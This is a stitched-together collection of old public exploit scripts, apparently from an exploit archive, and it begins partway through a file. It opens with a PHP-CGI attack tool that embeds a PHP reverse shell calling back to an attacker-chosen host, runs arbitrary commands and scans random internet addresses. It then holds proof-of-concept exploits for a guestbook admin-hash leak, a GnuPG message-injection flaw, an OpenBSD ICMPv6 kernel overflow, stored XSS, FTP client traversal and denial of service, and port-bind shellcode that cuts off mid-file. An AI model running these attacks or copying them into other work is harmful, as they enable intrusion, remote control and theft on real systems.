        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\
        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\r\nHost:localhost\r\n'\
        'Content-Type: text/html\r\nContent-Length:1\r\n\r\na\r\n'


def m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):
    c0nn_b4ck = \
    '''
    <? set_time_limit (0); $VERSION = "1.0"; $ip = "''' + cb_h0st + '''";
    $port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;
    $error_a = null; $shell = "unset HISTFILE; id; /bin/sh -i"; $daemon = 0;
    $debug = 0; if (function_exists("pcntl_fork")) {$pid = pcntl_fork();
    if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {
    exit(1);}$daemon = 1;} else {print "bla";}chdir("/");umask(0);
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {
    printit("$errstr ($errno)");exit(1);}$descriptorspec = array(
    0 => array("pipe", "r"), 1 => array("pipe", "w"),2 => array("pipe", "w"));
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);
    printit("Successfully opened reverse shell to $ip:$port");while (1) {
    if (feof($sock)) {printit("ERROR: Shell connection terminated");break;}
    if (feof($pipes[1])) {printit("ERROR: Shell process terminated");break;}
	$read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ");
	$input = fread($sock, $chunk_size);if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);
	if ($debug) printit("STDOUT: $input");fwrite($sock, $input);}
	if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}fclose($sock);
    fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);
    function printit ($string) {if (!$daemon) {print "$string\n";}}?>
    '''
    return c0nn_b4ck


def enc0dez():
    n33dz1 = ('cgi-bin', 'php')
    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',
            'suhosin.simulation=on', '-d', 'disable_functions=""', '-d',
            'open_basedir=none', '-d', 'auto_prepend_file=php://input',
            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',
            '-d', 'auto_prepend_file=php://input', '-n')
    fl4g = 0
    arg5 = ''
    p4th = ''
    plus = ''
 
    for x in n33dz2:
        if fl4g == 1:
            plus = '+'
        arg5 = arg5 + plus + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
        fl4g = 1
    for x in n33dz1:
        p4th = p4th + '/' + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
    return (p4th.upper(), arg5.upper())


def m4k3_p4yl0rd(p4yl0rd, m0de):
    p4th, arg5 = enc0dez()
    if m0de == VULN:
        p4yl0rd = t3st
    elif m0de == SCMD or m0de == XPLT:
        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\r\n' \
                'Host: ' + sys.argv[1] + '\r\n' \
                'Content-Type: application/x-www-form-urlencoded\r\n' \
                'Content-Length: ' + str(len(p4yl0rd)) + '\r\n\r\n' + p4yl0rd
    return p4yl0rd


def s3nd_sh1t(args, m0de, c0nn_b4ck):
    pat = '<b>Parse error</b>:'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(float(args.t))
        res = s.connect_ex((args.h, int(args.p)))
        if res == 0:
            if m0de == VULN:
                p4yl0rd = m4k3_p4yl0rd('', m0de)
                s.sendall(p4yl0rd)
                if pat in s.recv(4096):
                    print "--> " + args.h + " vu1n"
                    return args.h
                else:
                    if args.v:
                        print "--> %s n0t vu1n" % (args.h)
                    return
            elif m0de == SCMD:
                p4yl0rd = m4k3_p4yl0rd('<? system("' + args.c + '"); ?>', m0de)
                s.sendall(p4yl0rd)
                rd, wd, ex = select.select([s], [], [], float(args.t))
                if rd:
                    for line in s.makefile():
                        print line,
            elif m0de == XPLT:
                p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)
                s.sendall(p4yl0rd)
        else:
            if args.v:
                print "--> n0 w3bs3rv3r 0n %s" % (args.h)
    except socket.error:
        return
    return


def m4k3_r4nd_1p4ddr(num):
    h0sts = []
    for x in range(int(num)):
        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),
                random.randrange(0,255), random.randrange(0,255),
                random.randrange(0,255)))
    return h0sts


def sc4n_r4nd0m(args, h0st, m0de, vu1nz):
    args.h = h0st
    vu1nz.append(s3nd_sh1t(args, m0de, None))
    vu1nz = filter(None, vu1nz)
    return


def sc4n_fr0m_f1le(args, h0st, m0de, vu1nz):
    args.h = h0st.rstrip()
    vu1nz.append(s3nd_sh1t(args, m0de, None))
    vu1nz = filter(None, vu1nz)
    return


def sc4n_r4ng3(rsa, rsb, args, m0de):
    vu1nz = []
    for i in range (rsa[0], rsb[0]):
        for j in range (rsa[1], rsb[1]):
            for k in range (rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    args.h = str(i) + "." + str(j) + "." + str(k) + "." + str(l)
                    vu1nz.append(s3nd_sh1t(args, m0de, None))
                    time.sleep(0.005)
    vu1nz = filter(None, vu1nz)
    return vu1nz


def m4k3_ipv4_r4ng3(iprange):
    a = tuple(part for part in iprange.split('.'))
    rsa = (range(4))
    rsb = (range(4))
    for i in range(0,4):
        ga = a[i].find('-')
        if ga != -1:
            rsa[i] = int(a[i][:ga])
            rsb[i] = int(a[i][1+ga:]) + 1                                        
        else:
            rsa[i] = int(a[i])
            rsb[i] = int(a[i]) + 1
    return (rsa, rsb)


def parse_args():
    p = argparse.ArgumentParser(
    usage='\n\n  ./ap-unlock-v2.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\
            '\n  ./ap-unlock-v2.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',
    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
    opts = p.add_argument_group('0pt1ons', '')
    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',
            help='| t3st s1ngle h0st f0r vu1n')
    opts.add_argument('-p', default=80, metavar='80',
            help='| t4rg3t p0rt (d3fau1t: 80)')
    opts.add_argument('-c', metavar='\'uname -a;id\'',
            help='| s3nd c0mm4nds t0 h0st')
    opts.add_argument('-x', metavar='192.168.0.2:1337',
            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')
    opts.add_argument('-s', action='store_true',
            help='| t3st s1ngl3 h0st f0r vu1n')
    opts.add_argument('-r', metavar='133.1.3-7.7-37',
            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')
    opts.add_argument('-R', metavar='1337',
            help='| sc4nz num r4nd0m h0st5 f0r vu1n')
    opts.add_argument('-t', default=3, metavar='3',
            help='| t1me0ut in s3x (d3fau1t: 3)')
    opts.add_argument('-f', metavar='vu1n.lst',
            help='| wr1t3 vu1n h0sts t0 f1l3')
    opts.add_argument('-i', metavar='sc4nz.lst',
            help='| sc4nz h0sts fr0m f1le f0r vu1n')
    opts.add_argument('-S', metavar='2',
            help='| sl33pz in s3x b3tw33n thr3adz (d3fault: 2)')
    opts.add_argument('-T', default=2, metavar='4',
            help='| nuM sc4n thr3adz (d3fault: 4)')
    opts.add_argument('-v', action='store_true',
            help='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')
    args = p.parse_args()
    if not args.h and not args.r and not args.R and not args.i:
        p.print_help()
        sys.exit(0)
    return args


def wr1te_fil3(args, vu1nz):
    if args.f:
        if vu1nz:
            try:
                f = open(args.f, "w")
                f.write("\n".join(vu1nz)+"\n")
                f.close()
            except:
                sys.stderr.write('de1n3 mudd1 k0cht guT')
                sys.stderr.write('\n')
                raise SystemExit()
    return


def c0ntr0ller():
    vu1nz = []
    m0de = NONE
    try:
        args = parse_args()
        if not args.t:
            args.t = float(3)
        if args.h:
            if args.s:
                print "[+] sc4nn1ng s1ngl3 h0st %s " % (args.h)
                m0de = VULN
                s3nd_sh1t(args, m0de, None)
            elif args.c:
                print "[+] s3nd1ng c0mm4ndz t0 h0st %s " % (args.h)
                m0de = SCMD
                s3nd_sh1t(args, m0de, None)
            elif args.x:
                print "[+] xpl0it1ng b0x %s " % (args.h)
                m0de = XPLT
                if args.x.find(':') != -1:
                    if not args.x.split(':')[1]:
                        print "[-] 3rr0r: p0rt m1ss1ng"
                    else:
                        cb_h0st = args.x.split(':')[0]
                        cb_p0rt = args.x.split(':')[1]
                else:
                    print "[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r"
                c0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)
                s3nd_sh1t(args, m0de, c0nn_b4ck)
            else:
                print "[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch"
                sys.exit(-1)
        if args.r:
            print "[+] sc4nn1ng r4ng3 %s " % (args.r)
            m0de = VULN
            rsa, rsb = m4k3_ipv4_r4ng3(args.r)
            vu1nz = sc4n_r4ng3(rsa, rsb, args, m0de)
        if args.R:
            print "[+] sc4nn1ng %d r4nd0m b0xes" % (int(args.R))
            m0de = VULN
            if not args.S:
                args.S = float(2)
            h0sts = m4k3_r4nd_1p4ddr(int(args.R))
            for h0st in h0sts:
                try:
                    t = threading.Thread(target=sc4n_r4nd0m, args=(args, h0st,
                        m0de, vu1nz))
                    t.start()
                    time.sleep(float(args.S))
                    while threading.activeCount() > int(args.T):
                        time.sleep(2)
                except:
                    sys.stdout.flush()
                    sys.stdout.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
                    raise SystemExit
        if args.i:
            print "[+] sc4nn1ng b0xes fr0m f1le %s" % (args.i)
            m0de = VULN
            h0sts = tuple(open(args.i, 'r'))
            if not args.S:
                args.S = float(2)
            for h0st in h0sts:
                try:
                    t = threading.Thread(target=sc4n_fr0m_f1le, args=(args,
                        h0st, m0de, vu1nz))
                    t.start()
                    time.sleep(float(args.S))
                    while threading.activeCount() > int(args.T):
                        time.sleep(2)
                except KeyboardInterrupt:
                    sys.stdout.flush()
                    sys.stdout.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
                    raise SystemExit
            #sc4n_fr0m_f1le(args, h0sts, m0de, vu1nz)
    except KeyboardInterrupt:
        sys.stdout.flush()
        sys.stderr.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
        raise SystemExit
    wr1te_fil3(args, vu1nz)

    return


def m41n():
    if  __name__ == "__main__":
        print "--==[ ap-unlock-v2.py by noptrix@nullsecurity.net ]==--"
        c0ntr0ller()
    else:
        print "[-] 3rr0r: y0u fuck3d up dud3"
        sys.exit(1)
    print "[+] h0p3 1t h3lp3d"


# \o/ fr33 requiem 1337 h4x0rs ... 
m41n()

# e0Fsource: http://www.securityfocus.com/bid/22754/info

HyperBook Guestbook is prone to an information-disclosure vulnerability because the application fails to protect sensitive information.

An attacker can exploit this issue to access sensitive information that may lead to other attacks.

This issue affects version 1.3.0; other versions may also be affected.

#!/usr/bin/python
#Script                  :HyperBook Guestbook v1.30 (qbconfiguration.dat) Remote Admin md5 Hash Exploit
#Exploit Coded by        : PeTrO
#Exploit Discovered by   : SaO [www.saohackstyle.com]
#Credits to              :[soulreaver],Kuzey
 

import urllib
import sys
import parser

serv="http://"
i=0
for arg in sys.argv:
     i=i+1

if i!=3:
 print """\n\n
         \tHyperBook Guestbook v1.30  (qbconfiguration.dat) 
         \t\t    Remote Admin md5 Hash Exploit 
          \t                            
          \tUsage:Exploit.py [targetsite] [path] 
          \tExample:Exploit.py www.target.com /guestbook/\n\n"""
else:
    

    adres=sys.argv[1]
    path=sys.argv[2]

    str1=adres.join([serv,path])
    str2=str1.join(['','data/gbconfiguration.dat'])

    print "\n[~]Connecting..."
    url=urllib.urlopen(str2).read(); 
    print "\n[+]Connected!"
 
    test=url.find(path);

    t=0;
    print "\n\t\t\t-=[Admin md5 hash]=-"
    while(url[test+1]!=1): #parsing hash... by PeTrO..
              print url[test],

              if(url[test]=='\n'):
                 t=t+1;  

              if(t==2):
                 break;
                
              test=test+1;

    print "\n\n\t\t\t[ c0ded by PeTrO ]"

 
source: http://www.securityfocus.com/bid/22757/info

GnuPG is prone to a weakness that may allow an attacker to add arbitrary content into a message without the end user knowing.

An attacker may be able to exploit this issue in applications using GnuPG to add arbitrary content into a signed and/or encrypted message.

Exploiting this issue depends on the individual application's use of GnuPG. Individual records will be created detailing this issue in affected applications. 

#!/usr/bin/python
import os, gpg, sys, base64

clear_sign = open(sys.argv[1], "rb").read().splitlines()

start = clear_sign.index("-----BEGIN PGP SIGNED MESSAGE-----")
mid = clear_sign.index("-----BEGIN PGP SIGNATURE-----")
end = clear_sign.index("-----END PGP SIGNATURE-----")

text = '\r\n'.join(clear_sign[start+3:mid])
sign = '\n'.join(clear_sign[mid+3:end-1])

onepass = gpg.OnePassSignature()
onepass['keyid'] = (0x12341234,0x12341234)
onepass['digest_algo'] = 2
onepass['pubkey_algo'] = 1
onepass['sigclass'] = 1

plain1 = gpg.Plaintext()
plain1['name'] = 'original'
plain1['data'] = text
plain1['mode'] = 0x62

signature = gpg.Raw()
signature['data'] = base64.decodestring(sign)

compressed = gpg.Compressed()
compressed['algorithm'] = gpg.COMPRESS_ALGO_ZLIB
compressed['data'] = [onepass, plain1, signature]

pkt = gpg.Packet()
pkt['version'] = 1
pkt['data'] = compressed

os.write(1,str(pkt))
source: http://www.securityfocus.com/bid/22759/info

KMail is prone to a vulnerability that may allow an attacker to add arbitrary content into a message without the end user knowing.

An attacker may be able to exploit this issue to add arbitrary content into a GnuPG signed and/or encrypted message.

This vulnerability is due to the weakness discussed in BID 22757 (GnuPG Signed Message Arbitrary Content Injection Weakness) and has been assigned its own BID because of the specific way that KMail uses GnuPG.

This issue affects KMail versions prior to and including 1.9.5. 

#!/usr/bin/python
import os, gpg, sys, base64

clear_sign = open(sys.argv[1], "rb").read().splitlines()

start = clear_sign.index("-----BEGIN PGP SIGNED MESSAGE-----")
mid = clear_sign.index("-----BEGIN PGP SIGNATURE-----")
end = clear_sign.index("-----END PGP SIGNATURE-----")

text = '\r\n'.join(clear_sign[start+3:mid])
sign = '\n'.join(clear_sign[mid+3:end-1])

onepass = gpg.OnePassSignature()
onepass['keyid'] = (0x12341234,0x12341234)
onepass['digest_algo'] = 2
onepass['pubkey_algo'] = 1
onepass['sigclass'] = 1

plain1 = gpg.Plaintext()
plain1['name'] = 'original'
plain1['data'] = text
plain1['mode'] = 0x62

signature = gpg.Raw()
signature['data'] = base64.decodestring(sign)

compressed = gpg.Compressed()
compressed['algorithm'] = gpg.COMPRESS_ALGO_ZLIB
compressed['data'] = [onepass, plain1, signature]

pkt = gpg.Packet()
pkt['version'] = 1
pkt['data'] = compressed

os.write(1,str(pkt))
source: http://www.securityfocus.com/bid/22760/info

Evolution is prone to a vulnerability that may allow an attacker to add arbitrary content into a message without the end user knowing.

An attacker may be able to exploit this issue to add arbitrary content into a GnuPG signed and/or encrypted message.

This vulnerability is due to the weakness discussed in BID 22757 (GnuPG Signed Message Arbitrary Content Injection Weakness) and has been assigned its own BID because of the specific way that Evolution uses GnuPG.

This issue affects KMail versions prior to and including 2.8.1. 

#!/usr/bin/python
import os, gpg, sys, base64

clear_sign = open(sys.argv[1], "rb").read().splitlines()

start = clear_sign.index("-----BEGIN PGP SIGNED MESSAGE-----")
mid = clear_sign.index("-----BEGIN PGP SIGNATURE-----")
end = clear_sign.index("-----END PGP SIGNATURE-----")

text = '\r\n'.join(clear_sign[start+3:mid])
sign = '\n'.join(clear_sign[mid+3:end-1])

onepass = gpg.OnePassSignature()
onepass['keyid'] = (0x12341234,0x12341234)
onepass['digest_algo'] = 2
onepass['pubkey_algo'] = 1
onepass['sigclass'] = 1

plain1 = gpg.Plaintext()
plain1['name'] = 'original'
plain1['data'] = text
plain1['mode'] = 0x62

signature = gpg.Raw()
signature['data'] = base64.decodestring(sign)

compressed = gpg.Compressed()
compressed['algorithm'] = gpg.COMPRESS_ALGO_ZLIB
compressed['data'] = [onepass, plain1, signature]

pkt = gpg.Packet()
pkt['version'] = 1
pkt['data'] = compressed

os.write(1,str(pkt))
source: http://www.securityfocus.com/bid/22901/info

OpenBSD is prone to a remote buffer-overflow vulnerability because the software fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

A remote attacker can exploit this issue to execute arbitrary code with kernel-level privileges or to crash the affected computer. Successful exploits will result in a complete compromise of vulnerable computers or cause denial-of-service conditions.


#
# Description:
#   OpenBSD ICMPv6 fragment remote execution PoC
#
# Author:
#   Alfredo Ortega
#   Mario Vilas
#
# Copyright (c) 2001-2007 CORE Security Technologies, CORE SDI Inc.
# All rights reserved

from impacket import ImpactPacket
import struct
import socket
import time

class BSD_ICMPv6_Remote_BO:
    MACADDRESS = (0x00,0x0c,0x29,0x44,0x68,0x6f)
    def Run(self):
        self.s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
        self.s.bind(('eth0',0x86dd))
        sourceIP = '\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x0f\x29\xff\xfe\x44\x68\x6f'  # source address
        destIP   = '\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'  # destination address Multicast Link-level 
        firstFragment, secondFragment = self.buildOpenBSDPackets(sourceIP,destIP)
	validIcmp = self.buildValidICMPPacket(sourceIP,destIP)
	
	for i in range(100): # fill mbufs
        	self.sendpacket(firstFragment)
		self.sendpacket(validIcmp)
		time.sleep(0.01)
	for i in range(2): # Number of overflow packets to send. Increase if exploit is not reliable
        	self.sendpacket(secondFragment)
		time.sleep(0.1)
        	self.sendpacket(firstFragment)
		self.sendpacket(validIcmp)
		time.sleep(0.1)

    def sendpacket(self, data):
        ipe = ImpactPacket.Ethernet()
        ipe.set_ether_dhost(self.MACADDRESS)
        ipd = ImpactPacket.Data(data)
        ipd.ethertype = 0x86dd  # Ethertype for IPv6
        ipe.contains(ipd)
        p = ipe.get_packet()
        self.s.send(p)

    def buildOpenBSDPackets(self,sourceIP,destIP):
        HopByHopLenght= 1

        IPv6FragmentationHeader = ''
        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (00: Hop by Hop)
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
        IPv6FragmentationHeader += struct.pack('!B', 0x01)  # offset + More fragments: yes
        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id

        IPv6HopByHopHeader  = ''
        IPv6HopByHopHeader += struct.pack('!B', 0x2c)                    # next header (0x3A: ICMP)
        IPv6HopByHopHeader += struct.pack('!B', HopByHopLenght )         # Hdr Ext Len (frutaaaaaaa :D )
        IPv6HopByHopHeader += '\x00' *(((HopByHopLenght+1)*8)-2)         # Options

        longitud = len(IPv6HopByHopHeader)+len(IPv6FragmentationHeader)
	print longitud
        IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x00'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit

        IPv6Packet += sourceIP
        IPv6Packet += destIP

        firstFragment = IPv6Packet+IPv6HopByHopHeader+IPv6FragmentationHeader+('O'*150)

	self.ShellCode =  ''
        self.ShellCode += '\xcc' # int 3
	self.ShellCode += '\x83\xc4\x20\x5b\x5e\x5f\xc9\xc3\xcc' #fix ESP and ret

        ICMPv6Packet  = ''
        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
        ICMPv6Packet += '\x00'  # code
        ICMPv6Packet += '\xfb\x4e'  # checksum
        ICMPv6Packet += '\x33\xf6'  # ID
        ICMPv6Packet += '\x00\x00'  # sequence
        ICMPv6Packet +=  ('\x90'*(212-len(self.ShellCode)))+self.ShellCode
	# Start of the next mfub (we land here):
	ICMPv6Packet += '\x90\x90\x90\x90\xE9\x3B\xFF\xFF' # jump backwards
        ICMPv6Packet += '\xFFAAA\x01\x01\x01\x01AAAABBBBAAAABBBB' 
	# mbuf+0x20:
	trampoline = '\x8c\x23\x20\xd0' # jmp ESI on /bsd (find with "objdump -d /bsd | grep esi | grep jmp")
        ICMPv6Packet += 'AAAAAAAA'+trampoline+'CCCCDDDDEEEEFFFFGGGG' 
        longitud = len(ICMPv6Packet)


	IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x2c'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit
        IPv6Packet += sourceIP
        IPv6Packet += destIP

        IPv6FragmentationHeader = ''
        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (3A: icmpV6)
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset + More fragments:no
        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id

        secondFragment = IPv6Packet+IPv6FragmentationHeader+ICMPv6Packet

        return firstFragment, secondFragment



    def buildValidICMPPacket(self,sourceIP,destIP):

        ICMPv6Packet  = ''
        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
        ICMPv6Packet += '\x00'  # code
        ICMPv6Packet += '\xcb\xc4'  # checksum
        ICMPv6Packet += '\x33\xf6'  # ID
        ICMPv6Packet += '\x00\x00'  # sequence
	ICMPv6Packet += 'T'*1232

        longitud = len(ICMPv6Packet)

        IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x3A'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit
        IPv6Packet += sourceIP
        IPv6Packet += destIP

        icmpPacket = IPv6Packet+ICMPv6Packet

        return  icmpPacket

attack = BSD_ICMPv6_Remote_BO()
attack.Run()source: http://www.securityfocus.com/bid/23887/info

Python applications that use the 'PyLocale_strxfrm' function are prone to an information leak.

Exploiting this issue allows remote attackers to read portions of memory.

Python 2.4.4-2 and 2.5 are confirmed vulnerable. 

#!/usr/bin/python

import locale

print locale.setlocale(locale.LC_COLLATE, 'pl_PL.UTF8')
print repr(locale.strxfrm('a'))
#!/usr/bin/env python

'''
Exploit Title: Ability Mail Server 2013 Stored XSS
Date: 12/20/2013
Exploit Author: David Um
Vendor Homepage: http://www.code-crafters.com/
Software Link: http://download.code-crafters.com/ams.exe
Version: 3.1.1
Tested on: Windows Server 2003 SP2
CVE : CVE-2013-6162
Description: This proof of concept demonstrates a stored XSS vulnerability in e-mail clients when JavaScript is inserted into the body of an e-mail.
'''

import smtplib

email_addr = 'user@hack.local'

email = 'From: %s\n' % email_addr
email += 'To: %s\n' % email_addr
email += 'Subject: XSS\n'
email += 'Content-type: text/html\n\n'
email += '<script>alert("XSS")</script>'
s = smtplib.SMTP('192.168.58.140', 25)

s.login(email_addr, "user")
s.sendmail(email_addr, email_addr, email)
s.quit()
source: http://www.securityfocus.com/bid/25583/info

Unreal Commander is prone to multiple remote vulnerabilities, including a directory-traversal issue and a denial-of-service issue.

An attacker can exploit these issues to compromise the affected computer, write files to arbitrary locations, and crash the affected application.

Unreal Commander 0.92 (build 565) and 0.92 (build 573) are vulnerable; prior versions may also be affected. 

== Proof of Concept - Remote FTP Directory Traversal ==
# python FTP
# by Gynvael Coldwind
import socket

TransferSock = 0

def sendDirList (sock):
  (DataSock, Address) = TransferSock.accept()
  print "sendDirList: TransferSock accepted a connection"
  sock.send("150 Opening ASCII mode data connection for file list\r\n");
  DataSock.send("-rwxr-xr-x   2 ftp      ftp          4096 Aug  1
02:28 st\\..\\..\\..\\..\\..\\..\\BackSlashPoC\n");
  DataSock.close()
  sock.send("226 Transfer complete.\r\n");
  print "sendDirList: Transfer complete\r\n"

def sendFile (sock):
  (DataSock, Address) = TransferSock.accept()
  print "sendDirList: TransferSock accepted a connection"
  sock.send("150 Opening BINARY mode data connection for sth (5 bytes)\r\n");
  DataSock.send("Proof of Concept - Remote FTP Client directory
traversal vulnerability (G.C. - Hispasec)");
  DataSock.close()
  sock.send("226 Transfer complete.\r\n");
  print "sendDirList: Transfer complete\r\n"

def handleUSER (sock, cmd, argz): sock.send("331 Password required for
user\r\n")
def handlePASS (sock, cmd, argz): sock.send("230 User logged in.\r\n")
def handleSYST (sock, cmd, argz): sock.send("215 UNIX Type: L8\r\n")
def handleFEAT (sock, cmd, argz): sock.send("211-Features:\r\n
MDTM\r\n REST STREAM\r\n211 End\r\n");
def handleTYPE (sock, cmd, argz): sock.send("200 Type set to " + argz + "\r\n");
def handlePASV (sock, cmd, argz): sock.send("227 Entering Passive Mode
(127,0,0,1,10,10)\r\n");
def handlePWD (sock, cmd, argz): sock.send("257 \"/\" is current
directory.\r\n")
def handleCWD (sock, cmd, argz): sock.send("250 Requested file action
okay, completed.\r\n")
def handleLIST (sock, cmd, argz): sendDirList(sock)
def handleQUIT (sock, cmd, argz):
  sock.send("Bye.\r\n")
  sock.close()

def handleRETR (sock, cmd, argz):
  if argz == "/":
    sendDirList(sock)
else:
    sendFile(sock)


def unknown (sock, cmd, argz): sock.send("550 " + cmd + ": Operation
not permitted\r\n")

handlers = {
    'USER': handleUSER,
    'PASS': handlePASS,
    'SYST': handleSYST,
    'FEAT': handleFEAT,
    'TYPE': handleTYPE,
    'PASV': handlePASV,
    'PWD': handlePWD,
    'CWD': handleCWD,
    'LIST': handleLIST,
    'QUIT': handleQUIT,
    'RETR': handleRETR
    }

ControlSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ControlSock.bind(("127.0.0.1", 2021))
ControlSock.listen(1)

TransferSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TransferSock.bind(("127.0.0.1", 10 * 256 + 10))
TransferSock.listen(10)

# Control Sock loop
(ClientSock, Address) = ControlSock.accept()
ClientSock.send("220 PoCFTPD 1.2.3.4 Server ready.\r\n");
end = 0
while not end:
  cmd = ClientSock.recv(1024)
  print "Debug: recv -> " + cmd.strip()
  command = (cmd[0:4]).strip()
  argz = ((cmd.strip())[5:]).strip()
  handlers.get(command, unknown)(ClientSock, command, argz)
== Proof of Concept - Remote FTP Directory Traversal ==
# python FTP DoS
# by Gynvael Coldwind
import socket

TransferSock = 0

def handleUSER (sock, cmd, argz): sock.send("331 Password required for
user\r\n")
def handlePASS (sock, cmd, argz): sock.send("230 User logged in.\r\n")
def handleSYST (sock, cmd, argz): sock.send("215 UNIX Type: L8\r\n")
def handleFEAT (sock, cmd, argz): sock.send("211-Features:\r\n
MDTM\r\n REST STREAM\r\n211 End\r\n");
def handleTYPE (sock, cmd, argz): sock.send("200 Type set to " + argz + "\r\n");
def handlePASV (sock, cmd, argz): sock.send("227 Entering Passive Mode
(127,0,0,1,10,10)\r\n");
def handleQUIT (sock, cmd, argz):
  sock.send("Bye.\r\n")
  sock.close()

def unknown (sock, cmd, argz):
  sock.send("550 " + cmd + ": Operation not permitted\r\n")
  print "The Unreal Commander is not in an infinite loop. You may quit
this exploit, the infinite loop will last."

handlers = {
    'USER': handleUSER,
    'PASS': handlePASS,
    'SYST': handleSYST,
    'FEAT': handleFEAT,
    'TYPE': handleTYPE,
    'PASV': handlePASV,
    'QUIT': handleQUIT
    }

ControlSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ControlSock.bind(("127.0.0.1", 2021))
ControlSock.listen(1)

TransferSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TransferSock.bind(("127.0.0.1", 10 * 256 + 10))
TransferSock.listen(10)

# Control Sock loop
(ClientSock, Address) = ControlSock.accept()
ClientSock.send("220 PoCFTPD 1.2.3.4 Server ready.\r\n");
end = 0

while not end:
  cmd = ClientSock.recv(1024)
  print "Debug: recv -> " + cmd.strip()
  command = (cmd[0:4]).strip()
  argz = ((cmd.strip())[5:]).strip()
  handlers.get(command, unknown)(ClientSock, command, argz)#!/usr/bin/python
#Port bind exploit for apple quicktime rtsp vulnerability
#Tested on windows 2000 SP0 and SP4 with quicktime 7.1.3.100. Should be easy
#to port the exploit to others. All one needs to do is look for the appropriate
#jump address. Certain characters are not permitted in the shellcode.
#Alphanumeric shellcodes work fine.
#This script creates a qtl file which when clicked upon binds a shell to TCP
#port 4444. This file can be delivered through several means; HTTP, SMTP etc
#
# Winny Thomas ;-)
# Author shall bear no responsibility for any kind of screws up caused by using
# this code

import sys

#alpha numeric port bind shellcode from metasploit; binds shell to port 4444
shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
